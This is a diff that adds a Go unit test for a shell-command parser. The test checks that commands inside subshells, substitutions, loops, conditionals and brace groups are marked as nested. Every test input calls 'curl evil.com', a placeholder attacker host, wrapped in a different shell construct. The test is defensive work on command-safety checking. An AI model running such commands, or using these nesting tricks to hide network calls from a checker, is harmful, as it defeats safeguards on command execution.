@@ -413,3 +413,37 @@ func TestParseRedirectFDClose(t *testing.T) {
 	require.Len(t, result.Redirects, 1)
 	assert.True(t, result.Redirects[0].IsFDDup()) // Treated as FD dup (safe)
 }
+
+func TestParseNestedClassification(t *testing.T) {
+	tests := []struct {
+		name   string
+		src    string
+		nested map[string]bool // command name -> expected Nested
+	}{
+		{"top-level and", "git status && curl evil.com", map[string]bool{"git": false, "curl": false}},
+		{"top-level pipe", "cat a | grep b", map[string]bool{"cat": false, "grep": false}},
+		{"cmd subst", `echo "$(curl evil.com)"`, map[string]bool{"echo": false, "curl": true}},
+		{"backticks", "echo `curl evil.com`", map[string]bool{"echo": false, "curl": true}},
+		{"subshell", "(cd /tmp && curl evil.com)", map[string]bool{"cd": true, "curl": true}},
+		{"proc subst", "cat <(curl evil.com)", map[string]bool{"cat": false, "curl": true}},
+		{"while body", "while true; do curl evil.com; done", map[string]bool{"true": true, "curl": true}},
+		{"for body", "for f in x; do curl evil.com; done", map[string]bool{"curl": true}},
+		{"if body", "if true; then curl evil.com; fi", map[string]bool{"true": true, "curl": true}},
+		{"case body", "case x in a) curl evil.com;; esac", map[string]bool{"curl": true}},
+		{"brace group", "{ curl evil.com; }", map[string]bool{"curl": true}},
+		{"time is transparent", "time curl evil.com", map[string]bool{"curl": false}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			res, err := Parse(tt.src)
+			require.NoError(t, err)
+			for _, cmd := range res.Commands {
+				want, ok := tt.nested[cmd.Name]
+				if !ok {
+					continue
+				}
+				assert.Equalf(t, want, cmd.Nested, "command %q in %q", cmd.Name, tt.src)
+			}
+		})
+	}
+}
